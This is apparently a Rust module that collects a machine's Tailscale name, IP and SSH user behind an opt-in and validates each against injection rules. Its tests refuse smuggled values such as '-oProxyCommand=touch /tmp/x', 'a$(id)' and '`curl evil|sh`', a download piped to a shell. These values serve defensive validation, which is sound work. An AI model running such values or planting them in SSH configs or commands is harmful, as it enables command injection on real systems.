//! Access facts (plan Phase 6, runner half): how an operator reaches this
//! computer — its tailnet name/address and the OS user the runner runs as.
//!
//! ## Opt-in, default OFF
//!
//! Plan §6 makes access reporting opt-in per tenant. No tenant opt-in
//! plumbing exists yet (no coord setting, no runner setting carries it), so
//! the only switch today is the per-machine env var
//! [`ACCESS_FACTS_ENV`] = `1`. Unset or any other value reports `access: null`
//! — tailnet addresses and usernames are not sent by default.

use serde::Serialize;

/// Per-machine opt-in. Exactly `1` enables it.
pub(crate) const ACCESS_FACTS_ENV: &str = "QONTINUI_REPORT_ACCESS_FACTS";

/// `access` on the wire (contract §3).
#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub(crate) struct Access {
    pub(crate) tailnet_name: Option<String>,
    pub(crate) tailnet_ip: Option<String>,
    pub(crate) ssh_user: Option<String>,
}

/// The opt-in predicate over an injected value (testable without `set_var`).
pub(crate) fn opted_in(value: Option<&str>) -> bool {
    value.map(str::trim) == Some("1")
}

/// `(Self.DNSName without the trailing dot, first IPv4 in Self.TailscaleIPs)`
/// from `tailscale status --json`.
pub(crate) fn parse_tailscale_status(json: &str) -> (Option<String>, Option<String>) {
    let Ok(v) = serde_json::from_str::<serde_json::Value>(json) else {
        return (None, None);
    };
    let Some(me) = v.get("Self") else {
        return (None, None);
    };
    let name = me
        .get("DNSName")
        .and_then(|x| x.as_str())
        .map(|s| s.trim().trim_end_matches('.').to_string())
        .filter(|s| !s.is_empty());
    let ip = me
        .get("TailscaleIPs")
        .and_then(|x| x.as_array())
        .and_then(|ips| {
            ips.iter()
                .filter_map(|i| i.as_str())
                .find(|i| i.parse::<std::net::Ipv4Addr>().is_ok())
                .map(str::to_string)
        });
    (name, ip)
}

/// The OS user this process runs as.
fn os_user() -> Option<String> {
    ["USER", "USERNAME", "LOGNAME"]
        .iter()
        .find_map(|k| std::env::var(k).ok())
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
}

async fn tailscale_status_json() -> Option<String> {
    const TIMEOUT: std::time::Duration = std::time::Duration::from_secs(5);
    let mut candidates = vec!["tailscale".to_string()];
    // The Windows installer does not put the CLI on PATH; it lives under
    // `%ProgramFiles%\Tailscale`. Resolved from the environment, never a
    // hardcoded drive.
    if cfg!(windows) {
        if let Ok(pf) = std::env::var("ProgramFiles") {
            candidates.push(format!("{pf}\\Tailscale\\tailscale.exe"));
        }
    }
    for bin in candidates {
        let mut cmd = crate::process_helpers::tokio_no_window(&bin);
        cmd.args(["status", "--json"])
            .kill_on_drop(true)
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::null());
        match tokio::time::timeout(TIMEOUT, cmd.output()).await {
            Ok(Ok(out)) if out.status.success() => {
                return Some(String::from_utf8_lossy(&out.stdout).into_owned())
            }
            // Binary absent → try the next candidate; a failure of a binary
            // that exists (logged out, daemon down) → no tailnet facts.
            Ok(Err(e)) if e.kind() == std::io::ErrorKind::NotFound => continue,
            _ => return None,
        }
    }
    None
}

/// OpenSSH's `valid_ruser` rule for a remote user name — the value lands in
/// an operator's `~/.ssh/config` (`User …`) and on an `ssh` command line, so
/// anything that could smuggle an option or a shell metacharacter is refused:
/// empty, longer than 64, a leading `-`, any of `` '`";&<>|(){}$% `` or the
/// path/glob/history characters `` /*?[]~#! ``, a whitespace char followed by
/// `-`, a trailing `\`, or any control char.
pub(crate) fn valid_ssh_user(u: &str) -> bool {
    const BAD: &[char] = &[
        '\'', '`', '"', ';', '&', '<', '>', '|', '(', ')', '{', '}', '$', '%', '/', '*', '?', '[',
        ']', '~', '#', '!',
    ];
    if u.is_empty() || u.len() > 64 || u.starts_with('-') || u.ends_with('\\') {
        return false;
    }
    if u.chars().any(|c| c.is_control() || BAD.contains(&c)) {
        return false;
    }
    let chars: Vec<char> = u.chars().collect();
    !chars
        .windows(2)
        .any(|w| w[0].is_whitespace() && w[1] == '-')
}

/// A tailnet DNS name: an FQDN of at least two labels (the trailing dot
/// already stripped), each `[A-Za-z0-9-]`, 1-63 chars, no edge `-`.
pub(crate) fn valid_tailnet_name(n: &str) -> bool {
    if n.is_empty() || n.len() > 253 {
        return false;
    }
    let labels: Vec<&str> = n.split('.').collect();
    labels.len() >= 2
        && labels.iter().all(|l| {
            !l.is_empty()
                && l.len() <= 63
                && !l.starts_with('-')
                && !l.ends_with('-')
                && l.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
        })
}

/// An IP literal with NO zone/scope id (`fe80::1%eth0` is refused — a scope
/// names an interface on the reporting box, meaningless to any reader).
pub(crate) fn valid_tailnet_ip(ip: &str) -> bool {
    !ip.contains('%') && ip.parse::<std::net::IpAddr>().is_ok()
}

/// Drop every field that fails its rule (coord refuses such values with a 422,
/// and one bad field must not poison the whole report), and the whole
/// `access` when nothing survives. Returns the names of the dropped fields.
pub(crate) fn sanitize(a: Access) -> (Option<Access>, Vec<&'static str>) {
    let mut dropped = Vec::new();
    let tailnet_name = a.tailnet_name.filter(|n| {
        let ok = valid_tailnet_name(n);
        if !ok {
            dropped.push("tailnet_name");
        }
        ok
    });
    let tailnet_ip = a.tailnet_ip.filter(|n| {
        let ok = valid_tailnet_ip(n);
        if !ok {
            dropped.push("tailnet_ip");
        }
        ok
    });
    let ssh_user = a.ssh_user.filter(|n| {
        let ok = valid_ssh_user(n);
        if !ok {
            dropped.push("ssh_user");
        }
        ok
    });
    let any = tailnet_name.is_some() || tailnet_ip.is_some() || ssh_user.is_some();
    (
        any.then_some(Access {
            tailnet_name,
            tailnet_ip,
            ssh_user,
        }),
        dropped,
    )
}

/// Collect access facts, or `None` when not opted in (or nothing valid).
pub(crate) async fn collect() -> Option<Access> {
    if !opted_in(std::env::var(ACCESS_FACTS_ENV).ok().as_deref()) {
        return None;
    }
    let (tailnet_name, tailnet_ip) = match tailscale_status_json().await {
        Some(j) => parse_tailscale_status(&j),
        None => (None, None),
    };
    let (access, dropped) = sanitize(Access {
        tailnet_name,
        tailnet_ip,
        ssh_user: os_user(),
    });
    if !dropped.is_empty() {
        static LOGGED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
        if !LOGGED.swap(true, std::sync::atomic::Ordering::Relaxed) {
            tracing::info!(
                "fleet::computer: access fact(s) {dropped:?} failed validation and are omitted from the report"
            );
        }
    }
    access
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn access_is_off_unless_exactly_one() {
        assert!(!opted_in(None));
        assert!(!opted_in(Some("")));
        assert!(!opted_in(Some("true")));
        assert!(!opted_in(Some("0")));
        assert!(opted_in(Some("1")));
    }

    #[test]
    fn ssh_user_follows_openssh_valid_ruser() {
        for good in ["runner", "runner", "first.last", "a_b-c", "DOMAIN\\user"] {
            assert!(valid_ssh_user(good), "{good}");
        }
        for bad in [
            "",
            "-oProxyCommand=x",
            "a;rm",
            "a`id`",
            "a$(id)",
            "a|b",
            "a&b",
            "a>b",
            "a<b",
            "a'b",
            "a\"b",
            "a{b}",
            "a%b",
            "a -oX",
            "trailing\\",
            "ctl\u{7}",
            "new\nline",
            "`touch /tmp/pwned`",
            "a/b",
            "a*",
            "a?",
            "a[0]",
            "~root",
            "a#b",
            "a!b",
        ] {
            assert!(!valid_ssh_user(bad), "{bad:?} must be refused");
        }
        assert!(valid_ssh_user(&"a".repeat(64)));
        assert!(!valid_ssh_user(&"a".repeat(65)));
    }

    #[test]
    fn a_bad_field_is_dropped_alone_and_all_bad_drops_access() {
        let (a, dropped) = sanitize(Access {
            tailnet_name: Some("fleetbox.tailnet-x.ts.net".into()),
            tailnet_ip: Some("100.64.0.10".into()),
            ssh_user: Some("-oProxyCommand=touch /tmp/x".into()),
        });
        assert_eq!(
            serde_json::to_value(&a).unwrap(),
            serde_json::json!({
                "tailnet_name": "fleetbox.tailnet-x.ts.net",
                "tailnet_ip": "100.64.0.10",
                "ssh_user": null
            })
        );
        assert_eq!(dropped, vec!["ssh_user"]);

        let (a, dropped) = sanitize(Access {
            tailnet_name: Some("evil host;id".into()),
            tailnet_ip: Some("100.64.0".into()),
            ssh_user: Some("a b -c".into()),
        });
        assert_eq!(a, None);
        assert_eq!(dropped, vec!["tailnet_name", "tailnet_ip", "ssh_user"]);

        assert!(valid_tailnet_ip("fd7a:115c:a1e0::10"));
        assert!(valid_tailnet_ip("100.64.0.10"));
        assert!(!valid_tailnet_ip("fe80::1%eth0"));
        assert!(!valid_tailnet_ip("100.64.0.10%1"));
        assert!(valid_tailnet_name("fleetbox.tailnet-x.ts.net"));
        assert!(
            !valid_tailnet_name("fleetbox"),
            "a single label is not an FQDN"
        );
        assert!(!valid_tailnet_name("-lead.example"));
        assert!(!valid_tailnet_name("a..example"));
        assert!(!valid_tailnet_name("`id`.example"));

        // The backtick payload is dropped alone; the valid fields survive.
        let (a, dropped) = sanitize(Access {
            tailnet_name: Some("fleetbox.tailnet-x.ts.net".into()),
            tailnet_ip: Some("fe80::1%eth0".into()),
            ssh_user: Some("`curl evil|sh`".into()),
        });
        assert_eq!(
            serde_json::to_value(&a).unwrap(),
            serde_json::json!({
                "tailnet_name": "fleetbox.tailnet-x.ts.net",
                "tailnet_ip": null,
                "ssh_user": null
            })
        );
        assert_eq!(dropped, vec!["tailnet_ip", "ssh_user"]);
    }

    #[test]
    fn tailscale_status_yields_trimmed_name_and_ipv4() {
        let json = r#"{"Version":"1.76.1","Self":{"ID":"n1","HostName":"fleetbox","DNSName":"fleetbox.tailnet-x.ts.net.","TailscaleIPs":["fd7a:115c:a1e0::10","100.64.0.10"]},"Peer":{}}"#;
        assert_eq!(
            parse_tailscale_status(json),
            (
                Some("fleetbox.tailnet-x.ts.net".to_string()),
                Some("100.64.0.10".to_string())
            )
        );
        assert_eq!(parse_tailscale_status("{}"), (None, None));
        assert_eq!(parse_tailscale_status("not json"), (None, None));
    }
}
